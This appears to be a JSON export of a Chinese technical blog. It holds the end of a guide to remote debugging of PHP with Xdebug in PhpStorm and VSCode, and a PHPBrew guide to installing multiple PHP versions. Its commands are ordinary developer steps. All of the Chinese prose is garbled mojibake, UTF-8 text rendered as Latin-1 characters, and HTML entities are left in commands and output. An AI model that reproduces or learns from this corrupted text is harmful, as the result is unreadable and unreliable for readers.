·çš„ä¸“ä¸šè¯·æ±‚è°ƒè¯•å®¢æˆ·ç«¯ã€‚ é€šè¿‡æŸ¥é˜…Xdebug å®˜æ–¹æ–‡æ¡£ï¼Œå¾—çŸ¥ï¼Œæµè§ˆå™¨çš„æ’ä»¶å¼€å¯ Debug æ¨¡å¼ï¼Œä»…ä»…æ˜¯ç»™å½“å‰sessionå¢åŠ äº†ä¸€ä¸ª Cookie: XDEBUG_SESSION=PHPSTORM é‚£å°±ç®€å•äº†ï¼Œä»¥ curl ä¸¾ä¾‹çš„ä¸‰ç§æ–¹å¼ï¼š $ curl -H &quot;Cookie: XDEBUG_SESSION=PHPSTORM&quot; localhost:8000 $ curl --cookie XDEBUG_SESSION=PHPSTORM localhost:8000 $ curl -b XDEBUG_SESSION=PHPSTORM localhost:8000 Postman ä¹Ÿç±»ä¼¼ï¼Œä¸å†èµ˜è¿° è‡³æ­¤ï¼Œåœ¨ PhpStorm è°ƒè¯•éƒ¨ç½²åœ¨ Nginx ä¸­çš„é¡¹ç›®ï¼Œæ€é’ï¼ æå‡ºç–‘é—®è¿˜è®°å¾—å‰é¢æœ‰ä¸€å¼ å…³äºé…ç½® phpè§£é‡Šå™¨ å›¾ä¹ˆï¼ˆé‡æ–°æ¬è¿æ”¾åœ¨æœ¬æ®µä¸‹æ–¹ï¼‰ï¼Œé‡Œé¢æ˜æ˜é…ç½®äº† Xdebug çš„å‚æ•°ï¼Œè€Œ Web Server Debug Validation è¿˜æ˜¯æç¤ºè¦å» php.ini ä¸­æ·»åŠ  xdebug.remote_enable=1 JetBrains è‚¯å®šä¸ä¼šé‚£ä¹ˆæ— èŠï¼Œæ”¾ç½®ä¸€ä¸ªæ— ç”¨çš„é…ç½®é¡¹åœ¨è¿™é‡Œã€‚é‚£è¿™ä¸ªé…ç½®é¡¹ç©¶ç«Ÿå¯¹å“ªå—åœ°æ–¹ç”Ÿæ•ˆå‘¢ï¼Ÿ PhpStorm å·¥å…·æ ç‚¹å‡» Add Configurationï¼Œç‚¹å‡» + å·ï¼Œé€‰æ‹© PHP Build-in Web Serverï¼Œç«¯å£æ”¹ä¸º 8088 (æˆ–å…¶ä»–æœªè¢«å ç”¨ç«¯å£) é€‰æ‹©åˆšåˆšæ–°å»ºçš„ è¿è¡Œé…ç½® php build-in serverï¼Œç‚¹å‡»å³ä¾§ ç»¿è‰²ä¸‰è§’æŒ‰é’®ï¼Œè¿è¡Œé¡¹ç›®ï¼ˆåŒæ—¶ç¡®ä¿ ç›‘å¬æŒ‰é’® ä¹Ÿå·²æ¿€æ´»ï¼‰ å†æ¬¡åœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š 1$ curl -H &quot;Cookie: XDEBUG_SESSION&#x3D;PHPSTORM&quot; localhost:8000 Bingo!!! PhpStorm æˆåŠŸè¿›å…¥äº†è°ƒè¯•çŠ¶æ€å¹¶ä¸”åœåœ¨äº†æ–­ç‚¹å¤„ï¼ å‘æ•£ 1: åœ¨ PhpStorm è°ƒè¯• è¿œç¨‹æœåŠ¡ä¸Šæ–‡æè¿°çš„éƒ½æ˜¯è°ƒè¯•æœ¬åœ°ç¯å¢ƒï¼Œå³æœåŠ¡éƒ¨ç½²åœ¨æœ¬åœ° Nginxï¼Œé€šè¿‡æœ¬åœ°çš„ php-fpm è°ƒç”¨ php è§£é‡Šå™¨ è¿›è¡Œè¯·æ±‚åˆ†å‘å¤„ç†ï¼Œâ€œåŠ è½½â€çš„æ˜¯æœ¬åœ°çš„ Xdebugï¼ˆè°ƒè¯•ç«¯å£ä¸ºé»˜è®¤çš„ 9000ï¼‰ï¼Œè€ŒåŒæ—¶ PhpStorm ä¹Ÿç›‘å¬æœ¬åœ°çš„ Xdebug çš„ 9000 ç«¯å£è¿›è¡Œæ‹¦æˆªè°ƒè¯•ã€‚ å¯å¾€å¾€æ›´å¤šçš„æƒ…å†µæ˜¯ï¼ŒæœåŠ¡å¹¶ä¸éƒ¨ç½²åœ¨æœ¬åœ°ï¼Œè€Œåœ¨ è¿œç«¯æœåŠ¡å™¨ï¼Œè¿™ä¸ªæ—¶å€™å¾—å¦‚ä½•è°ƒè¯•å‘¢ï¼Ÿ æ¥ä¸‹æ¥åœ¨ å¦ä¸€å°ä¸»æœº(192.168.1.101) ä¸Šè°ƒè¯• æœ¬æœº(192.168.1.100) çš„æœåŠ¡ï¼Œæ¥æ¨¡æ‹Ÿç°å®å¼€å‘ä¸­çš„ è¿œç¨‹è°ƒè¯•ã€‚ æœ¬æœº(192.168.1.100) ä¸Šåœ¨ php.ini å°¾éƒ¨æ·»åŠ  xdebug.remote_connect_back=1 å¦ä¸€å°ä¸»æœº(192.168.1.101) çš„ PhpStorm ç‚¹å‡»å·¥å…·æ ä¸Šçš„ ç›‘å¬æŒ‰é’® å¼€å¯ç›‘å¬ï¼Œå¹¶ä¸”åœ¨ä»£ç çª—å£è®¾ç½®æ–­ç‚¹ åœ¨ è¯¥ä¸»æœº(192.168.1.101) çš„ç»ˆç«¯ä¸Šæ‰§è¡Œ 1$ curl -H &quot;Cookie: XDEBUG_SESSION&#x3D;PHPSTORM&quot; 192.168.1.100:8000 å³å¯çœ‹åˆ° PhpStorm è¿›å…¥äº†è°ƒè¯•æ¨¡å¼å¹¶ä¸”é¡ºåˆ©åœåœ¨äº†æ–­ç‚¹å¤„ã€‚ å‘æ•£ 2ï¼šåœ¨ VSCode ä¸­è°ƒè¯• æœ¬åœ°æœåŠ¡æ‰“å¼€ VSCodeï¼Œå®‰è£… PHP Debug æ‰©å±• æ‰“å¼€é¡¹ç›®å·¥ç¨‹ï¼Œç‚¹å‡»å·¦è¾¹æ çš„ Runï¼Œç‚¹å‡» Create a launch.json fileï¼Œé€‰æ‹© PHP ç¯å¢ƒ VSCode å°†ä¼šè‡ªåŠ¨åˆ›å»ºä¸¤ä¸ªé…ç½®ï¼š Listen for XDebugï¼šè¿™ä¸ªé…ç½®å°±æ˜¯ç±»ä¼¼ PhpStorm ä¸­çš„ ç›‘å¬æŒ‰é’® Launch currently open scriptï¼šæ‰§è¡ŒæŒ‰ç…§ php-cli æ¨¡å¼è¿è¡Œ/è°ƒè¯• å½“å‰çª—å£çš„phpè„šæœ¬ é€‰æ‹© Listen for XDebug å¹¶ç‚¹å‡»å·¦ä¾§çš„ ç»¿è‰²å›¾æ ‡ å¼€å§‹è¿è¡Œç›‘å¬ï¼Œå¹¶ä¸”æ‰“ä¸Šæ–­ç‚¹ï¼Œå‘½ä»¤è¡Œä¸‹æ‰§è¡Œ curl --cookie XDEBUG_SESSION=VSCODE localhost:8000ï¼Œåˆ™èƒ½çœ‹åˆ°VSCode æˆåŠŸè¿›å…¥äº†è°ƒè¯•çŠ¶æ€å¹¶ä¸”åœåœ¨äº†æ–­ç‚¹å¤„ã€‚ å‘æ•£ 3ï¼šåœ¨ VSCode è°ƒè¯• è¿œç¨‹æœåŠ¡ä¸ å‘æ•£ 1 ç±»ä¼¼ï¼Œåœ¨ å¦ä¸€å°ä¸»æœº(192.168.1.101) ä¸Šï¼š ç¡®ä¿ php.ini å·²æ·»åŠ  xdebug.remote_connect_back=1 é€‰æ‹© Listen for XDebug å¹¶ç‚¹å‡»å·¦ä¾§çš„ ç»¿è‰²å›¾æ ‡ å¼€å§‹è¿è¡Œç›‘å¬ï¼Œå¹¶ä¸”æ‰“ä¸Šæ–­ç‚¹ å‘½ä»¤è¡Œä¸‹æ‰§è¡Œ curl --cookie XDEBUG_SESSION=VSCODE 192.168.1.100:8000 åˆ™èƒ½çœ‹åˆ°VSCode æˆåŠŸè¿›å…¥äº†è°ƒè¯•çŠ¶æ€å¹¶ä¸”åœåœ¨äº†æ–­ç‚¹å¤„ã€‚ æ‰€ä»¥ï¼Œåœ¨ VSCode è°ƒè¯•éƒ¨ç½²åœ¨ Nginx ä¸­çš„æœåŠ¡ï¼ˆæœ¬åœ°ä¸è¿œç¨‹ï¼‰ï¼Œä¹Ÿé¡ºåˆ©æ€é’ï¼ ä¸€äº› æ€è€ƒ æˆ– ç–‘æƒ‘ Xdebug çš„ IDE keyï¼ˆå³ä½¿åœ¨ php.ini ä¸­é…ç½®äº† xdebug.idekey=xxxï¼‰åœ¨ è¿œç¨‹è°ƒè¯• æ—¶å¹¶ä¸èµ·ä½œç”¨ï¼Œè°ƒè¯•è¯·æ±‚æ—¶åœ¨ Cookie ä¸­é™„åŠ çš„ XDEBUG_SESSION è®¾ç½®ä»»æ„éç©ºå­—ç¬¦ä¸²éƒ½ç”Ÿæ•ˆã€‚æ˜¯ Xdebug çš„ bug ä¹ˆï¼Ÿ æ— è®ºé‡‡ç”¨ PhpStorm è¿˜æ˜¯ VSCode è¿›è¡Œè¿œç¨‹è°ƒè¯•ä¸­ï¼Œæ˜æ˜è¿œç¨‹æœåŠ¡å™¨çš„ Xdebug è°ƒè¯•ç«¯å£ï¼ˆé»˜è®¤ä¸º9000ï¼‰å¯¹å¤–ä¸å¯è¾¾ï¼ˆä»… localhost å¯è®¿é—®ï¼‰ï¼Œä½†æ˜¯ æ‰“ä¸Šæ–­ç‚¹ å¼€å¯ç›‘å¬ åˆèƒ½è°ƒè¯•äº†å‘¢ï¼Ÿ å¤šäººååŒè°ƒè¯•ï¼Œå‚è€ƒ JetBrains æ–‡æ¡£ Multiuser debugging via Xdebug proxies ä½¿ç”¨ DBGpä»£ç† 2020-12-05 è¡¥å……æ›´æ–°PhpStorm 2020.3 å·²å‘å¸ƒå‘å¸ƒæ—¥å¿— æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"}]},{"title":"PHPBrew ä½¿ç”¨æŒ‡å—","slug":"Using-phpbrew","date":"2020-12-01T02:50:12.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Using-phpbrew.html","link":"","permalink":"https://blog.chaosjohn.com/Using-phpbrew.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€å’‹ä¸€çœ‹ï¼Œè¿™ä¸ªåå­—å–å¾—ï¼Œè‚¯å®šæ˜¯è·Ÿ Homebrew å­¦çš„ã€‚æ—¢ç„¶ Homebrew çš„å®šä½æ˜¯ macOS ä¸Šçš„ åŒ…ç®¡ç†å™¨ï¼Œé‚£ PHPBrew è‚¯å®šä¹Ÿè·Ÿ åŒ…ç®¡ç†å™¨ æ²¾ç‚¹è¾¹ã€‚æ²¡é”™ï¼Œå®ƒå¯ä»¥ç”¨æ¥ æ„å»º å’Œ å®‰è£… å¤šä¸ªç‰ˆæœ¬çš„ php åˆ°ç”¨æˆ·ä¸»ç›®å½•($HOME)ä¸‹ã€‚ é¡¹ç›®ä¸»é¡µ æŠ„ä¸€ä¸‹ PHPBrew çš„ç‰¹æ€§: ç¼–è¯‘é…ç½®é€‰é¡¹ç®€åŒ–ä¸ºvariantï¼Œä¸ç”¨å†è¿‡äºæ‹…å¿ƒæœå¯»è·¯å¾„ é€šè¿‡ä¸åŒçš„variant(æ¯”å¦‚PDO, mysql, sqlite, debugç­‰ç­‰)è¿›è¡Œæ„å»ºphp ç¼–è¯‘ apache å’Œ nginx æ¨¡å—ï¼Œå¹¶ä¸”æŒ‰ä¸åŒç‰ˆæœ¬åŒºåˆ† æ„å»ºå’Œå®‰è£…åˆ°ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼Œå…å»rootæƒé™ ç‰ˆæœ¬é—´æ˜“äºåˆ‡æ¢ï¼Œä¸”ä¸bash/zshé›†æˆ è‡ªåŠ¨ç‰¹æ€§æ£€æµ‹ æ˜“äºå®‰è£…å’Œå¯ç”¨ phpæ‰©å±• åˆ°å½“å‰ç¯å¢ƒ æ”¯æŒå®‰è£…å¤šä¸ªç‰ˆæœ¬çš„ php åˆ°ç³»ç»Ÿç¯å¢ƒä¸­ ä¸º Homebrew å’Œ MacPorts ä¼˜åŒ–è·¯å¾„æ£€æµ‹ ç¯å¢ƒéœ€æ±‚ å¹³å°æ”¯æŒ Mac OS 10.5+ Ubuntu Debian RHEL / CentOS ä¾èµ–éœ€æ±‚ PHP5.3+ bz2 curl gcc, binutils, autoconf, libxml, zlib, readline å„å¹³å°ä¸Šçš„ä¾èµ–å®‰è£…è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œç¬”è€…ä»…é™„ä¸Š Mac OS + Homebrew å’Œ Ubuntu 20.04çš„å®‰è£…å‘½ä»¤ Mac OS12$ xcode-select --install$ brew install autoconf pkg-config Ubuntu 20.0412$ sudo apt update$ sudo apt install build-essential libbz2-dev libreadline-dev libsqlite3-dev libssl-dev libxml2-dev php7.4-cli php7.4-bz2 pkg-config å®‰è£…ä¸‹è½½ 12$ curl -L -O https:&#x2F;&#x2F;github.com&#x2F;phpbrew&#x2F;phpbrew&#x2F;releases&#x2F;latest&#x2F;download&#x2F;phpbrew.phar$ chmod +x phpbrew.phar å®‰è£…åˆ°é…ç½®åœ¨ $PATH ç¯å¢ƒå˜é‡é‡Œçš„binç›®å½•ï¼Œæ¯”å¦‚å®˜æ–¹æ–‡æ¡£é‡Œçš„ /usr/local/binï¼ˆç¬”è€…ç”¨çš„æ˜¯ $HOME/binï¼‰ 1sudo mv phpbrew.phar &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpbrew è®¾ç½®åˆå§‹åŒ–shellç¯å¢ƒ 1$ phpbrew init init æŒ‡ä»¤å°†ä¼šåˆ›å»º $HOME/.phpbrew ç›®å½• å°†ä¸‹é¢ä¸€è¡ŒåŠ å…¥ .bashrc æˆ–è€… .zshrc 1[[ -e ~&#x2F;.phpbrew&#x2F;bashrc ]] &amp;&amp; source ~&#x2F;.phpbrew&#x2F;bashrc è®¾ç½®æœå¯»è·¯å¾„å‰ç¼€è®¾ç½®é»˜è®¤çš„æœå¯»è·¯å¾„å‰ç¼€ï¼Œç”¨äºæœå¯»ä¾èµ–åº“ï¼Œå¯é€‰é¡¹æœ‰ macports, homebrew, debian, ubuntu æˆ–è€… è‡ªå®šä¹‰è·¯å¾„ Homebrewç”¨æˆ·1$ phpbrew lookup-prefix homebrew MacPortsç”¨æˆ·1$ phpbrew lookup-prefix macports åŸºæœ¬ç”¨æ³•åˆ—ä¸¾å·²çŸ¥çš„ç‰ˆæœ¬ 12345678910$ phpbrew known&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via php streamDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via php stream8.0: 8.0.0 ...7.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6 ...7.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18 ...7.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27 ...7.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26 ...7.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 ... æƒ³çœ‹åˆ°æ›´å¤šå°ç‰ˆæœ¬ 12345678910111213141516$ phpbrew known --moreRead local release list (last update: 2020-12-01 03:46:52 UTC).You can run &#96;phpbrew update&#96; or &#96;phpbrew known --update&#96; to get a newer release list.8.0: 8.0.07.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6, 7.4.5, 7.4.4, 7.4.3, 7.4.2, 7.4.1, 7.4.07.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18, 7.3.17, 7.3.16, 7.3.15, 7.3.14, 7.3.13, 7.3.12, 7.3.11, 7.3.10, 7.3.9, 7.3.8, 7.3.7, 7.3.6, 7.3.5, 7.3.4, 7.3.3, 7.3.2, 7.3.1, 7.3.07.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27, 7.2.26, 7.2.25, 7.2.24, 7.2.23, 7.2.22, 7.2.21, 7.2.20, 7.2.19, 7.2.18, 7.2.17, 7.2.16, 7.2.15, 7.2.14, 7.2.13, 7.2.12, 7.2.11, 7.2.10, 7.2.9, 7.2.8, 7.2.7, 7.2.6, 7.2.5, 7.2.4, 7.2.3, 7.2.27.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26, 7.1.25, 7.1.24, 7.1.23, 7.1.22, 7.1.21, 7.1.20, 7.1.19, 7.1.18, 7.1.17, 7.1.16, 7.1.15, 7.1.147.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 æ›´æ–°æœ€æ–°ç‰ˆæœ¬å‘è¡Œåˆ—è¡¨ 1234567891011$ phpbrew update&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via php streamDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via php stream8.0: 1 releases7.4: 14 releases7.3: 26 releases7.2: 33 releases7.1: 20 releases7.0: 7 releases&#x3D;&#x3D;&#x3D;&gt; Done è·å–å°äº7.0çš„è€ç‰ˆæœ¬ï¼ˆå®˜æ–¹æ–‡æ¡£å·²æ»åï¼Œè¿˜ä»…ä»…åªæŠŠ å°äº5.4 ä½œä¸ºè€ç‰ˆæœ¬ï¼‰ æ³¨æ„ï¼šä¸ä¿è¯èƒ½æˆåŠŸæ„å»ºè¿™äº›ä¸è¢«PHPBrewå®˜æ–¹æ”¯æŒçš„ç‰ˆæœ¬ 1$ phpbrew update --old åˆ—ä¸¾å°äº7.0çš„è€ç‰ˆæœ¬ 12345678910111213141516171819$ phpbrew known --old&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via curl extensionDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via curl extensionDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;5&amp;max&#x3D;1000 via curl extension8.0: 8.0.0 ...7.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6 ...7.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18 ...7.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27 ...7.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26 ...7.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 ...5.6: 5.6.40, 5.6.39, 5.6.38, 5.6.37, 5.6.36, 5.6.35, 5.6.34, 5.6.33 ...5.5: 5.5.38, 5.5.37, 5.5.36, 5.5.35, 5.5.34, 5.5.33, 5.5.32, 5.5.31 ...5.4: 5.4.45, 5.4.44, 5.4.43, 5.4.42, 5.4.41, 5.4.40, 5.4.39, 5.4.38 ...5.3: 5.3.29, 5.3.28, 5.3.27, 5.3.26, 5.3.25, 5.3.24, 5.3.23, 5.3.22 ...5.2: 5.2.17, 5.2.16, 5.2.15, 5.2.14, 5.2.13, 5.2.12, 5.2.11, 5.2.10 ...5.1: 5.1.6, 5.1.5, 5.1.4, 5.1.3, 5.1.2, 5.1.1, 5.1.0 ...5.0: 5.0.5, 5.0.4, 5.0.3, 5.0.2, 5.0.1, 5.0.0 ...PHPBrew needs PHP 5.3 or above to run. build&#x2F;switch to versions below 5.3 at your own risk. å¼€å§‹æ„å»ºä½ è‡ªå·±çš„PHPç”¨é»˜è®¤variantç®€å•æ„å»ºå¹¶å®‰è£…PHPï¼š 1$ phpbrew install 7.4.13 +default è¿™é‡Œæˆ‘ä»¬æ¨èä½¿ç”¨ default è®¾ç½®ï¼Œå®ƒæ¶µç›–äº†å¤§éƒ¨åˆ†å¹¿æ³›ä½¿ç”¨çš„variantï¼›å¦‚æœä½ éœ€è¦ä¸€ä¸ª æœ€å°åŒ– å®‰è£…ï¼Œé‚£å°±ç§»é™¤ defaultï¼Œæ›¿æ¢æˆåˆ«çš„variantï¼ˆç»ç¬”è€…æ‘¸ç´¢ï¼Œæœ€å°åŒ– ä¸º +opcache -xmlï¼‰ã€‚ é€šè¿‡ä¼ é€’å‚æ•° -j æˆ–è€… â€“jobs è¿›è¡Œå¹¶è¡Œç¼–è¯‘ï¼š 1$ phpbrew install -j $(nproc) 7.4.13 +default åŒ…å«æµ‹è¯•ï¼š 1$ phpbrew install --test 7.4.13 +default åŒ…å«è°ƒè¯•ä¿¡æ¯ï¼š 1$ phpbrew -d install --test 7.4.13 +default å®‰è£…å°äº5.3çš„è€ç‰ˆæœ¬ï¼ˆç¬”è€…å®æµ‹5.0ç‰ˆæœ¬çš„é“¾æ¥å‡å·²ä¸å¯è®¿é—®ï¼‰ 1$ phpbrew install --old 5.2.17 å®‰è£… next ä¸ç¨³å®šç‰ˆï¼š 1$ phpbrew install next ä»GitHubä»“åº“çš„æŸtagå®‰è£… 1$ phpbrew install github:php&#x2F;php-src@PHP-7.0 ç”¨ as ç»™æ„å»ºå®‰è£…çš„PHPå–åˆ«åï¼Œä»¥ç¬”è€…åœ¨å‰é¢æè¿°çš„ æœ€å°åŒ– å®‰è£…ä¸¾ä¾‹ 1$ phpbrew install 7.4.13 +opcache -xml as 7.4.13-minimal æ¸…ç†æ„å»ºç›®å½•123$ phpbrew clean 7.4.13-minimal&#x3D;&#x3D;&#x3D;&gt; Running make clean: &#x2F;usr&#x2F;bin&#x2F;make -C &#39;&#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13-minimal&#39; --quiet &#39;clean&#39;Distribution is cleaned up. Woof! VariantsPHPBrew å¸®ä½ å®‰æ’æ„å»ºå‚æ•°ï¼Œä½ å¯ä»¥ç®€å•åœ°æŒ‡å®švariantï¼ŒPHPBrewä¼šè‡ªåŠ¨æ£€æµ‹ include è·¯å¾„å¹¶ä¸”æ„å»ºç¼–è¯‘é€‰é¡¹ã€‚ PHPBrew æä¾›äº†é»˜è®¤çš„å’Œè™šæ‹Ÿçš„variantã€‚é»˜è®¤çš„åŒ…å«äº†å¤§éƒ¨åˆ†å¹¿æ³›ä½¿ç”¨çš„variantsï¼›è™šæ‹Ÿçš„åˆ™å®šä¹‰äº†ä¸€ç»„variantï¼Œå³ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿvariantå¯ä»¥åŒæ—¶é€‰ç”¨å¤šä¸ªvariantã€‚ æŸ¥çœ‹PHPBrewæä¾›äº†å“ªäº›variantï¼š 1234567891011121314151617181920212223242526272829303132333435$ phpbrew variantsVariants: all, apxs2, bcmath, bz2, calendar, cgi, cli, ctype, curl, dba, debug, dom, dtrace, editline, embed, exif, fileinfo, filter, fpm, ftp, gcov, gd, gettext, gmp, hash, iconv, imap, inifile, inline, intl, ipc, ipv6, json, kerberos, ldap, libgcc, mbregex, mbstring, mcrypt, mhash, mysql, opcache, openssl, pcntl, pcre, pdo, pear, pgsql, phar, phpdbg, posix, readline, session, soap, sockets, sodium, sqlite, static, tidy, tokenizer, wddx, xml, xmlrpc, zip, zlib, ztsVirtual variants: dbs: sqlite, mysql, pgsql, pdo mb: mbstring, mbregex neutral: small: bz2, cli, dom, filter, ipc, json, mbregex, mbstring, pcre, phar, posix, readline, xml, curl, openssl default: bcmath, bz2, calendar, cli, ctype, dom, fileinfo, filter, ipc, json, mbregex, mbstring, mhash, pcntl, pcre, pdo, pear, phar, posix, readline, sockets, tokenizer, xml, curl, openssl, zip everything: dba, ipv6, dom, calendar, wddx, static, inifile, inline, cli, ftp, filter, gcov, zts, json, hash, exif, mbstring, mbregex, libgcc, pdo, posix, embed, sockets, debug, phpdbg, zip, bcmath, fileinfo, ctype, cgi, soap, pcntl, phar, session, tokenizer, opcache, imap, ldap, tidy, kerberos, xmlrpc, fpm, dtrace, pcre, mhash, mcrypt, zlib, curl, readline, editline, gd, intl, sodium, openssl, mysql, sqlite, pgsql, xml, gettext, iconv, bz2, ipc, gmp, pearUsing variants to build PHP: phpbrew install php-5.3.10 +default phpbrew install php-5.3.10 +mysql +pdo phpbrew install php-5.3.10 +mysql +pdo +apxs2 phpbrew install php-5.3.10 +mysql +pdo +apxs2&#x3D;&#x2F;usr&#x2F;bin&#x2F;apxs2 å¯ä»¥çœ‹åˆ°è™šæ‹Ÿvariantæœ‰ï¼šdbs, mb, neutral, small, default, everything ï¼ˆè¡¨æ˜ä¸Šæ¥çœ‹ neutral æ˜¯æœ€ç²¾ç®€çš„ï¼Œå®ƒä¸æ·»åŠ ä»»ä½•ç¼–è¯‘é€‰é¡¹ï¼Œä½†å®é™…å®‰è£…è¿‡ç¨‹ä¸­è¿˜æ˜¯ä¼šå¯ç”¨ xml å’Œ opcacheï¼Œè€Œè¿™äºŒè€…ä¸­åªæœ‰åè€…æ— ä»»ä½•ç¬¬ä¸‰æ–¹ä¾èµ–ã€‚æ‰€ä»¥çœŸæ­£æ„ä¹‰ä¸Šçš„ æœ€å°åŒ– ä¸º +opcache -xml æˆ–è€… +neutral -xmlï¼‰ éœ€è¦å¯ç”¨ä¸€ä¸ªvariantï¼Œç›´æ¥åœ¨variantå‰åŠ ä¸€ä¸ª + å· éœ€è¦ç¦ç”¨ä¸€ä¸ªvariantï¼Œç›´æ¥åœ¨variantå‰åŠ ä¸€ä¸ª - å· + å’Œ - å·å¯ä»¥å¤šä¸ªéšæ„ç»„åˆ æŒ‡å®šä¾èµ–è·¯å¾„ï¼Œæ¯”å¦‚æ„å»ºpgsqlæ‰©å±•æ—¶ 1$ phpbrew install 7.4.13 +pdo +pgsql&#x3D;&#x2F;opt&#x2F;local&#x2F;lib&#x2F;postgresql91&#x2F;bin åœ¨ /opt/local/lib/postgresql91/bin è·¯å¾„ä¸‹çš„ pg_config æ˜¯æ„å»ºæ—¶éœ€è¦çš„ ä¼ é€’é¢å¤–çš„configureé€‰é¡¹12$ phpbrew install 7.4.13 +mysql +sqlite -- \\ --enable-ftp --apxs2&#x3D;&#x2F;opt&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apxs ä½¿ç”¨ä¸åˆ‡æ¢ä½¿ç”¨ï¼ˆä¸´æ—¶åˆ‡æ¢ç‰ˆæœ¬ï¼‰ 12$ phpbrew use 7.4.13$ phpbrew use 7.4.13-minimal åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬ 1$ phpbrew switch 7.4.13-minimal ä»PHPBrewçš„ç‰ˆæœ¬åˆ‡æ¢åˆ°ç³»ç»Ÿå®‰è£…çš„ç‰ˆæœ¬ 1$ phpbrew off åˆ—ä¸¾å®‰è£…çš„æ‰€æœ‰phpç‰ˆæœ¬1$ phpbrew list æ‰©å±•å®‰è£…å™¨PHPBrew è¿˜èƒ½æ–¹ä¾¿çš„å¸®åŠ©ä½ å®‰è£… PHPæ‰©å±•ï¼ˆæ— è®ºæ˜¯PHPæºç å†…è‡ªå¸¦çš„äº¦æˆ–æ˜¯æ¥è‡ªäº PECL çš„ï¼‰ å¦‚æœæ˜¯PHPæºç å†…è‡ªå¸¦çš„ï¼ŒPHPBrewä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°æºç ç›®å½•è¿›è€Œå®‰è£…æ‰©å±•ï¼›å¦åˆ™ä¼šå» PECL http://pecl.php.netå»è·å–æ‰©å±•æºç åŒ… PHPBrewåŒæ—¶ä¼šä¸ºå®‰è£…ä¸Šçš„æ‰©å±•åˆ›å»ºé…ç½®ï¼Œçœå»ä½ æ‰‹å†™å¯ç”¨æ‰©å±•çš„é…ç½®æ–‡ä»¶ã€‚é…ç½®æ–‡ä»¶å¤¹ä½äº: $HOME/.phpbrew/php/&#123;php-version&#125;/var/db å®‰è£…æ‰©å±• - æœ€ç®€å•çš„æ–¹å¼åœ¨ä½ å®‰è£…ä»»ä½•æ‰©å±•ä¹‹å‰ï¼Œä½ åº”è¯¥åˆ‡æ¢åˆ°éœ€è¦å®‰è£…æ‰©å±•çš„phpç‰ˆæœ¬ï¼š 1$ phpbrew use 7.4.13-minimal ç„¶åè¿è¡Œ ext install æ¥å®‰è£…è‡ªå·±éœ€è¦çš„æ‰©å±• 1234$ phpbrew ext install redis$ phpbrew ext install xdebug$ phpbrew ext install acpu$ phpbrew ext install memcache å®‰è£…æ‰©å±• - æŒ‡å®šç¨³å®šæ€§ç‰ˆæœ¬ 